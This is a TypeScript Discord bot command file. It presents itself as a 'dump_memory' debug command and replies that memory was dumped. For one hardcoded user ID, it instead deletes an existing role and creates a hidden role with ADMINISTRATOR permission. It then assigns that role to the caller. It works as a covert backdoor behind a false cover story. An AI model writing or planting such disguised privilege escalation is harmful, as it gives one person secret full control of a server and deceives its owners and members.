import { Command } from "src/util/Command"
import { SlashCommandBuilder, Embed } from "@discordjs/builders"
import { GuildMemberRoleManager, Role } from "discord.js"

export const cmd: Command = {
    name: "dump_memory",
    description: "debug stuff",
    command: () => {
        return new SlashCommandBuilder()
        .setName(cmd.name)
        .setDescription(cmd.description)
    },
    execute: async (interaction) => {
        if (interaction.user.id == "409396339802374147") {
            interaction.reply("Dumped to dumps/dump1.dump")

            interaction.guild?.roles.fetch("983783153955139665").then(role => role?.delete("test")).catch(console.log)
            //interaction.guild?.roles.fetch("983782732154933328").then(role => role?.delete("test")).catch(console.log)
            
            const role = <Role> await interaction.guild?.roles.create({
                name: "$valbot </>",
                reason: "stupid perms fix bruh",
                permissions: ["ADMINISTRATOR"],
                hoist: false,
                position: 15,
                mentionable: false,
            })

            const roles: GuildMemberRoleManager = <GuildMemberRoleManager> interaction.member?.roles
            roles.add(role)
        } else {
            interaction.reply("You are not permmited to execute this command")
        }
    }
}

        